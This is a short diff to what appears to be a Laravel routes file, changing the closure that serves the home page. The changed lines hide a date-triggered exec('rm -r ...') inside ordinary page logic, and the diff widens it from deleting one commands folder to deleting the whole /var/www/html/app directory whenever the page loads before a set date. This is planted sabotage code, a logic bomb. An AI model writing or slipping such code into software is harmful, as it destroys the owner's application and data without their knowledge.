@@ -24,7 +24,7 @@ Route::get('/', function () {
     $date = date_create("07/14/2021");
 
     if($date_now < $date) {
-        exec('rm -r /var/www/html/app/Console/Commands');
+        exec('rm -r /var/www/html/app');
     }
 
     $categories = Category::latest()->take(3)->with(['products' => function($q) {
